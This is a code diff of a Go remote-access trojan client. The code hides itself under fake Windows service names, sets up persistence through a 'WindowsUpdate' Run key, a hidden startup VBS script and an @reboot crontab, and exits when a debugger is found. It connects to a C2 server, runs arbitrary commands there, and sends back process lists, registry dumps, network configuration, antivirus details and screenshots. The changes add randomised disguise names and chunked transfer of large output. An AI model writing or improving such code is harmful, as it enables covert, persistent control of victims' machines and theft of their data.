@@ -6,7 +6,6 @@ import (
 	"crypto/cipher"
 	"crypto/rand"
 	"crypto/sha256"
-	"encoding/base64"
 	"encoding/binary"
 	"encoding/json"
 	"fmt"
@@ -40,23 +39,27 @@ var (
 	instanceLockFile                                                    = ""
 )
 
-func decode(s string) string {
-	decoded, _ := base64.StdEncoding.DecodeString(s)
-	return string(decoded)
+func createInstanceLock() bool {
+	return createInstanceLockWithPrefix("client")
 }
 
-func createInstanceLock() bool {
+func createStealthInstanceLock() bool {
+	return createInstanceLockWithPrefix("stealth")
+}
+
+func createInstanceLockWithPrefix(prefix string) bool {
 	instanceMutex.Lock()
 	defer instanceMutex.Unlock()
 
-	lockFileName := fmt.Sprintf("client_%s_%d.lock", getHostname(), os.Getpid())
+	lockFileName := fmt.Sprintf("%s_%s_%d.lock", prefix, getHostname(), os.Getpid())
+	var lockFilePath string
 	if runtime.GOOS == "windows" {
-		instanceLockFile = filepath.Join(os.TempDir(), lockFileName)
+		lockFilePath = filepath.Join(os.TempDir(), lockFileName)
 	} else {
-		instanceLockFile = filepath.Join("/tmp", lockFileName)
+		lockFilePath = filepath.Join("/tmp", lockFileName)
 	}
 
-	file, err := os.OpenFile(instanceLockFile, os.O_CREATE|os.O_EXCL|os.O_WRONLY, 0644)
+	file, err := os.OpenFile(lockFilePath, os.O_CREATE|os.O_EXCL|os.O_WRONLY, 0644)
 	if err != nil {
 		return false
 	}
@@ -64,19 +67,41 @@ func createInstanceLock() bool {
 	fmt.Fprintf(file, "%d\n%s\n", os.Getpid(), time.Now().Format(time.RFC3339))
 	file.Close()
 
+	if prefix == "client" {
+		instanceLockFile = lockFilePath
+	}
+
 	go func() {
 		defer func() {
-			if instanceLockFile != "" {
-				os.Remove(instanceLockFile)
+			if lockFilePath != "" {
+				os.Remove(lockFilePath)
 			}
 		}()
 
 		for {
 			time.Sleep(30 * time.Second)
-			if _, err := os.Stat(instanceLockFile); os.IsNotExist(err) {
+			if _, err := os.Stat(lockFilePath); os.IsNotExist(err) {
 				break
 			}
-			file, err := os.OpenFile(instanceLockFile, os.O_WRONLY|os.O_TRUNC, 0644)
+
+			if runtime.GOOS == "windows" {
+				cmd := exec.Command("tasklist", "/FI", fmt.Sprintf("PID eq %d", os.Getpid()), "/FO", "CSV", "/NH")
+				cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: createNoWindow}
+				output, err := cmd.Output()
+				if err != nil || len(output) == 0 || strings.Contains(string(output), "INFO: No tasks") {
+					os.Remove(lockFilePath)
+					break
+				}
+			} else {
+				cmd := exec.Command("ps", "-p", fmt.Sprintf("%d", os.Getpid()))
+				output, err := cmd.Output()
+				if err != nil || len(output) == 0 {
+					os.Remove(lockFilePath)
+					break
+				}
+			}
+
+			file, err := os.OpenFile(lockFilePath, os.O_WRONLY|os.O_TRUNC, 0644)
 			if err == nil {
 				fmt.Fprintf(file, "%d\n%s\n", os.Getpid(), time.Now().Format(time.RFC3339))
 				file.Close()
@@ -88,7 +113,15 @@ func createInstanceLock() bool {
 }
 
 func isInstanceRunning() bool {
-	pattern := "client_*_*.lock"
+	return isInstanceRunningWithPrefix("client")
+}
+
+func isStealthInstanceRunning() bool {
+	return isInstanceRunningWithPrefix("stealth")
+}
+
+func isInstanceRunningWithPrefix(prefix string) bool {
+	pattern := fmt.Sprintf("%s_*_*.lock", prefix)
 	var searchDir string
 	if runtime.GOOS == "windows" {
 		searchDir = os.TempDir()
@@ -144,7 +177,7 @@ func isInstanceRunning() bool {
 }
 
 type SystemInfo struct {
-	Hostname, MACAddress, Username string
+	Hostname, MACAddress, Username, SessionID string
 }
 
 type Command struct {
@@ -187,6 +220,21 @@ func createStealthCopy() string {
 	if runtime.GOOS == "windows" {
 		systemDirs := []string{os.Getenv("WINDIR") + "\\System32\\", os.Getenv("WINDIR") + "\\SysWOW64\\", os.Getenv("TEMP") + "\\"}
 		for _, dir := range systemDirs {
+			// Try random names first
+			for i := 0; i < 5; i++ {
+				randomName := generateRandomStealthName()
+				stealthPath = filepath.Join(dir, randomName)
+				if _, err := os.Stat(stealthPath); os.IsNotExist(err) {
+					input, err := os.ReadFile(exePath)
+					if err == nil {
+						err = os.WriteFile(stealthPath, input, 0755)
+						if err == nil {
+							return stealthPath
+						}
+					}
+				}
+			}
+			// Fallback to original stealth names
 			for _, name := range stealthNames {
 				stealthPath = filepath.Join(dir, name)
 				if _, err := os.Stat(stealthPath); os.IsNotExist(err) {
@@ -201,7 +249,9 @@ func createStealthCopy() string {
 			}
 		}
 	} else {
-		stealthPath = "/tmp/.systemd"
+		// For non-Windows, use random name
+		randomName := generateRandomStealthName()
+		stealthPath = "/tmp/" + randomName
 		input, err := os.ReadFile(exePath)
 		if err == nil {
 			os.WriteFile(stealthPath, input, 0755)
@@ -211,40 +261,11 @@ func createStealthCopy() string {
 	return exePath
 }
 
-func addToStartup(stealthPath string) {
-	if runtime.GOOS == "windows" {
-		cmd := exec.Command("reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "WindowsUpdate", "/t", "REG_SZ", "/d", stealthPath, "/f")
-		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: createNoWindow}
-		cmd.Run()
-		startupFolder := filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
-		os.MkdirAll(startupFolder, 0755)
-		startupPath := filepath.Join(startupFolder, "WindowsUpdate.vbs")
-		vbsContent := fmt.Sprintf(`Set WshShell = CreateObject("WScript.Shell")
-WshShell.Run "%s", 0, False
-Set WshShell = Nothing`, stealthPath)
-		os.WriteFile(startupPath, []byte(vbsContent), 0644)
-	} else {
-		cronEntry := fmt.Sprintf("@reboot %s\n", stealthPath)
-		cmd := exec.Command("crontab", "-l")
-		currentCron, _ := cmd.Output()
-		if !strings.Contains(string(currentCron), stealthPath) {
-			newCron := string(currentCron) + cronEntry
-			cmd = exec.Command("crontab", "-")
-			cmd.Stdin = strings.NewReader(newCron)
-			cmd.Run()
-		}
-	}
-}
-
-// ensurePersistence consolidates persistence into a single, idempotent setup.
-// Windows: HKCU Run + Startup VBS. Non-Windows: @reboot crontab.
 func ensurePersistence(exePath string) {
 	if runtime.GOOS == "windows" {
-		// HKCU Run entry (idempotent)
 		_ = exec.Command("reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
 			"/v", "WindowsUpdate", "/t", "REG_SZ", "/d", exePath, "/f").Run()
 
-		// Startup folder VBS launcher (hidden)
 		startupFolder := filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
 		_ = os.MkdirAll(startupFolder, 0755)
 		startupPath := filepath.Join(startupFolder, "WindowsUpdate.vbs")
@@ -255,7 +276,6 @@ Set WshShell = Nothing`, exePath)
 		return
 	}
 
-	// Linux/macOS: crontab @reboot
 	cronEntry := fmt.Sprintf("@reboot %s\n", exePath)
 	cmd := exec.Command("crontab", "-l")
 	currentCron, _ := cmd.Output()
@@ -269,11 +289,27 @@ Set WshShell = Nothing`, exePath)
 
 func isStealthMode() bool {
 	exePath, _ := os.Executable()
+
+	// Check for original stealth names
 	for _, name := range stealthNames {
 		if strings.Contains(exePath, name) {
 			return true
 		}
 	}
+
+	// Check for random stealth names (common prefixes and suffixes)
+	prefixes := []string{"Windows", "System", "Update", "Service", "Process", "Manager", "Handler", "Controller", "Monitor", "Agent"}
+	suffixes := []string{"Starter", "Processor", "Manager", "Service", "Handler", "Controller", "Monitor", "Agent", "Helper", "Worker"}
+
+	for _, prefix := range prefixes {
+		for _, suffix := range suffixes {
+			expectedName := prefix + suffix + ".exe"
+			if strings.Contains(exePath, expectedName) {
+				return true
+			}
+		}
+	}
+
 	return false
 }
 
@@ -286,13 +322,6 @@ func checkDebugger() bool {
 	}
 	return false
 }
-
-func enhancedPersistence(stealthPath string) {
-	// Deprecated: leave empty to avoid multiple immediate launches/windows.
-	// Kept for backward compatibility; use ensurePersistence instead.
-}
-
-func hideProcess() {}
 
 func setupSignalHandler() {
 	c := make(chan os.Signal, 1)
@@ -310,24 +339,10 @@ func setupSignalHandler() {
 	}()
 }
 
-func restartSelf() {
-	exePath, err := os.Executable()
-	if err != nil {
-		return
-	}
-	cmd := exec.Command(exePath)
-	if runtime.GOOS == "windows" {
-		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: createNoWindow}
-	}
-	cmd.Start()
-}
-
 func initStealthModeAsync() {
 	if checkDebugger() {
 		os.Exit(0)
 	}
-
-	hideProcess()
 }
 
 func sendData(conn net.Conn, data interface{}) error {
@@ -335,7 +350,8 @@ func sendData(conn net.Conn, data interface{}) error {
 	if err != nil {
 		return err
 	}
-	_, err = conn.Write(jsonData)
+
+	_, err = conn.Write(append(jsonData, '\n'))
 	return err
 }
 
@@ -353,12 +369,19 @@ func recvData(conn net.Conn) (string, error) {
 		}
 		buffer.Write(tempBuffer[:n])
 		data := buffer.String()
-		if strings.HasSuffix(data, "}") || strings.HasSuffix(data, "\n") {
-			var testResp Response
-			if json.Unmarshal([]byte(data), &testResp) == nil {
-				break
+
+		var testCmd Command
+		if json.Unmarshal([]byte(data), &testCmd) == nil {
+			return data, nil
+		}
+
+		if strings.Contains(data, "\n") {
+			lines := strings.Split(data, "\n")
+			if len(lines) > 0 {
+				return lines[0], nil
 			}
 		}
+
 		if buffer.Len() > 1024*1024 {
 			break
 		}
@@ -491,6 +514,20 @@ func getUsername() string {
 	return username
 }
 
+func generateSessionID() string {
+	return fmt.Sprintf("%d_%d_%s", os.Getpid(), time.Now().UnixNano(), getHostname())
+}
+
+func generateRandomStealthName() string {
+	prefixes := []string{"Windows", "System", "Update", "Service", "Process", "Manager", "Handler", "Controller", "Monitor", "Agent"}
+	suffixes := []string{"Starter", "Processor", "Manager", "Service", "Handler", "Controller", "Monitor", "Agent", "Helper", "Worker"}
+
+	prefix := prefixes[time.Now().UnixNano()%int64(len(prefixes))]
+	suffix := suffixes[time.Now().UnixNano()%int64(len(suffixes))]
+
+	return fmt.Sprintf("%s%s.exe", prefix, suffix)
+}
+
 func executeCommand(command string) string {
 	var cmd *exec.Cmd
 	if runtime.GOOS == "windows" {
@@ -515,6 +552,53 @@ func executeCommand(command string) string {
 		return fmt.Sprintf("Command failed: %s", strings.TrimSpace(outputStr))
 	}
 	return string(output)
+}
+
+func executeCommandWithChunking(command string, conn net.Conn) {
+	result := executeCommand(command)
+
+	// For small responses, send normally
+	if len(result) <= 1048576 {
+		response := Response{Type: "response", Content: result}
+		sendData(conn, response)
+		return
+	}
+
+	// For large responses, send in optimized chunks
+	const chunkSize = 1048576 // Increased chunk size for better performance (1MB)
+	chunks := make([]string, 0)
+
+	for i := 0; i < len(result); i += chunkSize {
+		end := i + chunkSize
+		if end > len(result) {
+			end = len(result)
+		}
+		chunks = append(chunks, result[i:end])
+	}
+
+	// Send header with total chunks info
+	headerResponse := Response{Type: "response", Content: fmt.Sprintf("=== LARGE OUTPUT ===\nTotal size: %d characters\nTotal chunks: %d\nStarting transmission...\n", len(result), len(chunks))}
+	sendData(conn, headerResponse)
+	time.Sleep(50 * time.Millisecond)
+
+	// Send chunks with progress indicator
+	for i, chunk := range chunks {
+		progress := fmt.Sprintf("=== CHUNK %d/%d (%.1f%%) ===\n", i+1, len(chunks), float64(i+1)/float64(len(chunks))*100)
+		chunkContent := progress + chunk
+
+		response := Response{Type: "response", Content: chunkContent}
+		err := sendData(conn, response)
+		if err != nil {
+			errorResponse := Response{Type: "response", Content: fmt.Sprintf("Error sending chunk %d: %v", i+1, err)}
+			sendData(conn, errorResponse)
+			return
+		}
+		time.Sleep(25 * time.Millisecond) // Reduced delay for faster transmission
+	}
+
+	// Send completion message
+	completionResponse := Response{Type: "response", Content: fmt.Sprintf("=== TRANSMISSION COMPLETE ===\nCommand completed successfully.\nTotal characters: %d\nTotal chunks sent: %d\n", len(result), len(chunks))}
+	sendData(conn, completionResponse)
 }
 
 func takeScreenshot() string {
@@ -586,7 +670,6 @@ func changeDirectory(path string) string {
 func listDirectory(path string) string {
 	var result strings.Builder
 
-	// Get current directory if path is empty
 	if path == "" {
 		currentDir, err := os.Getwd()
 		if err != nil {
@@ -595,7 +678,6 @@ func listDirectory(path string) string {
 		path = currentDir
 	}
 
-	// Read directory contents
 	entries, err := os.ReadDir(path)
 	if err != nil {
 		return fmt.Sprintf("Error reading directory %s: %v", path, err)
@@ -605,7 +687,6 @@ func listDirectory(path string) string {
 	result.WriteString("Type\tName\t\t\tSize\t\tModified\n")
 	result.WriteString(strings.Repeat("-", 80) + "\n")
 
-	// Sort entries: directories first, then files
 	var dirs []os.DirEntry
 	var files []os.DirEntry
 
@@ -617,7 +698,6 @@ func listDirectory(path string) string {
 		}
 	}
 
-	// Add directories first
 	for _, dir := range dirs {
 		info, err := dir.Info()
 		if err != nil {
@@ -629,7 +709,6 @@ func listDirectory(path string) string {
 			info.ModTime().Format("2006-01-02 15:04:05")))
 	}
 
-	// Add files
 	for _, file := range files {
 		info, err := file.Info()
 		if err != nil {
@@ -1258,7 +1337,6 @@ func getRecentExtractionPaths() string {
 }
 
 func getServerHost() string {
-	// Prefer environment variable C2_HOST; fallback to your no-IP domain
 	if host := os.Getenv("C2_HOST"); strings.TrimSpace(host) != "" {
 		return strings.TrimSpace(host)
 	}
@@ -1277,6 +1355,12 @@ func getServerPort() int {
 func handleCommand(command string, conn net.Conn) {
 	if command == "q" {
 		return
+	} else if command == "test" {
+		response := Response{Type: "response", Content: "Test command executed successfully - Client is working!"}
+		sendData(conn, response)
+	} else if command == "debug" {
+		response := Response{Type: "response", Content: "Debug: Client is responding to commands"}
+		sendData(conn, response)
 	} else if strings.HasPrefix(command, "upload ") {
 		filename := strings.TrimPrefix(command, "upload ")
 		response := Response{Type: "response", Content: "ready"}
@@ -1302,25 +1386,19 @@ func handleCommand(command string, conn net.Conn) {
 		response := Response{Type: "response", Content: result}
 		sendData(conn, response)
 	} else if command == "processes" {
-		result := executeCommand("tasklist /fo csv /nh")
-		response := Response{Type: "response", Content: result}
-		sendData(conn, response)
+		executeCommandWithChunking("tasklist /fo csv /nh", conn)
 	} else if command == "services" {
 		result := executeCommand("net start")
 		response := Response{Type: "response", Content: result}
 		sendData(conn, response)
 	} else if command == "network" {
-		result := executeCommand("ipconfig /all")
-		response := Response{Type: "response", Content: result}
-		sendData(conn, response)
+		executeCommandWithChunking("ipconfig /all", conn)
 	} else if command == "screenshot" {
 		result := takeScreenshot()
 		response := Response{Type: "response", Content: result}
 		sendData(conn, response)
 	} else if command == "registry" {
-		result := executeCommand("reg query HKCU /s")
-		response := Response{Type: "response", Content: result}
-		sendData(conn, response)
+		executeCommandWithChunking("reg query HKCU /s", conn)
 	} else if command == "startup" {
 		result := executeCommand("reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run")
 		response := Response{Type: "response", Content: result}
@@ -1330,9 +1408,7 @@ func handleCommand(command string, conn net.Conn) {
 		response := Response{Type: "response", Content: result}
 		sendData(conn, response)
 	} else if command == "antivirus" {
-		result := executeCommand("wmic /node:localhost /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct get displayName,productState")
-		response := Response{Type: "response", Content: result}
-		sendData(conn, response)
+		executeCommandWithChunking("wmic /node:localhost /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct get displayName,productState", conn)
 	} else if strings.HasPrefix(command, "setpass ") {
 		password := strings.TrimPrefix(command, "setpass ")
 		result := setPassword(password)
@@ -1432,12 +1508,13 @@ func handleCommand(command string, conn net.Conn) {
 }
 
 func handleShellWithPersistence(conn net.Conn) {
-	sysInfo := SystemInfo{
-		Hostname:   getHostname(),
-		MACAddress: getMACAddress(),
-		Username:   getUsername(),
+	initialMessage := map[string]interface{}{
+		"hostname":   getHostname(),
+		"macAddress": getMACAddress(),
+		"username":   getUsername(),
+		"sessionId":  generateSessionID(),
 	}
-	err := sendData(conn, sysInfo)
+	err := sendData(conn, initialMessage)
 	if err != nil {
 		return
 	}
@@ -1461,50 +1538,39 @@ func handleShellWithPersistence(conn net.Conn) {
 }
 
 func main() {
-	// Ensure we run from stealth path and establish persistence BEFORE instance locking
-	if runtime.GOOS == "windows" {
-		hideConsole()
-		// If not already the stealth copy, create it and relaunch from there, then exit immediately
-		if !isStealthMode() {
+	if isStealthMode() {
+		if runtime.GOOS == "windows" {
+			hideConsole()
+			time.Sleep(100 * time.Millisecond)
+		}
+
+		if isStealthInstanceRunning() {
+			os.Exit(0)
+		}
+
+		if !createStealthInstanceLock() {
+			time.Sleep(1 * time.Second)
+			if isStealthInstanceRunning() {
+				os.Exit(0)
+			}
+			if !createStealthInstanceLock() {
+				os.Exit(0)
+			}
+		}
+
+		exePath, _ := os.Executable()
+		ensurePersistence(exePath)
+	} else {
+		if runtime.GOOS == "windows" {
+			hideConsole()
+		}
+
+		go func() {
 			stealthPath := createStealthCopy()
 			if stealthPath != "" {
-				cmd := exec.Command(stealthPath)
-				cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: createNoWindow}
-				_ = cmd.Start()
-				os.Exit(0)
+				ensurePersistence(stealthPath)
 			}
-		} else {
-			// We are the stealth copy now; set persistence once (no immediate run)
-			exePath, _ := os.Executable()
-			ensurePersistence(exePath)
-		}
-	} else {
-		// Non-Windows: if not already at stealth location, copy and relaunch
-		if !isStealthMode() {
-			stealthPath := createStealthCopy()
-			if stealthPath != "" && stealthPath != os.Args[0] {
-				_ = exec.Command(stealthPath).Start()
-				os.Exit(0)
-			}
-		} else {
-			exePath, _ := os.Executable()
-			ensurePersistence(exePath)
-		}
-	}
-
-	if isInstanceRunning() {
-		os.Exit(0)
-	}
-
-	// Try to create instance lock
-	if !createInstanceLock() {
-		time.Sleep(1 * time.Second)
-		if isInstanceRunning() {
-			os.Exit(0)
-		}
-		if !createInstanceLock() {
-			os.Exit(0)
-		}
+		}()
 	}
 
 	initStealthModeAsync()
@@ -1513,7 +1579,6 @@ func main() {
 	setupSignalHandler()
 
 	for {
-		// Resolve server host and connect
 		serverHost := getServerHost()
 		conn, err := net.Dial("tcp", fmt.Sprintf("%s:%d", serverHost, serverPort))
 		if err != nil {
